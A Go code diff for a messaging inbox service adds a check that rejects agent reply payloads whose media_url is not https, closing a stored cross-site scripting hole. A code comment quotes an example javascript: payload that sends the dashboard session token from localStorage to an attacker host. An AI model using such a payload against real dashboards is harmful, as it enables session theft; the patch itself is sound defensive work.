@@ -17,6 +17,20 @@ import (
 // Inbox — session list + agent actions
 // ============================================
 
+// unsafeReplyMediaURL reports whether an agent reply payload carries a
+// media_url that is not https. The payload is stored verbatim and the inbox
+// renders media_url as an href, so a javascript: URL would execute in the
+// owner's dashboard origin (the CSP allows 'unsafe-inline' and the session
+// token is JS-readable by design). Extracted from agentReply so the rule can be
+// tested without a database; the renderer's isSafeHTTPSURL is the second line.
+func unsafeReplyMediaURL(payload map[string]any) bool {
+	raw, ok := payload["media_url"].(string)
+	if !ok || raw == "" {
+		return false
+	}
+	return !strings.HasPrefix(strings.ToLower(raw), "https://")
+}
+
 // listInbox — cross-platform sessions with avatar + last message (owner-scoped).
 func (a *App) listInbox(w http.ResponseWriter, r *http.Request) (any, error) {
 	user, _ := UserFrom(r)
@@ -254,6 +268,16 @@ func (a *App) agentReply(w http.ResponseWriter, r *http.Request, sessionID strin
 	}
 	if err := a.ensureSessionAccess(r.Context(), sessionID, user, PermInboxReply); err != nil {
 		return nil, err
+	}
+	// A payload is stored verbatim and the inbox renders its media_url as an href.
+	// A seat with inbox_reply could therefore persist
+	// `media_url: "javascript:fetch('https://evil/?t='+localStorage.token)"` and it
+	// executed in the owner's dashboard origin when they clicked the attachment
+	// (the CSP allows 'unsafe-inline' and the session token is JS-readable by
+	// design). The renderer also guards with isSafeHTTPSURL; this is the first
+	// line, so the bad value never reaches the database at all.
+	if unsafeReplyMediaURL(req.Payload) {
+		return nil, ErrBadRequest("media_url 必须是 https 地址")
 	}
 	// Load the session's platform + recipient for delivery. Web/NULL-platform
 	// sessions (the website widget) have no provider mapping: the reply is
@@ -585,7 +609,7 @@ func (a *App) unarchiveSession(w http.ResponseWriter, r *http.Request, sessionID
 	return a.setSessionArchived(w, r, sessionID, false)
 }
 
-func (a *App) setSessionArchived(w http.ResponseWriter, r *http.Request, sessionID string, archived bool) (any, error) {
+func (a *App) setSessionArchived(_ http.ResponseWriter, r *http.Request, sessionID string, archived bool) (any, error) {
 	user, _ := UserFrom(r)
 	if err := a.ensureSessionAccess(r.Context(), sessionID, user, PermInboxReply); err != nil {
 		return nil, err
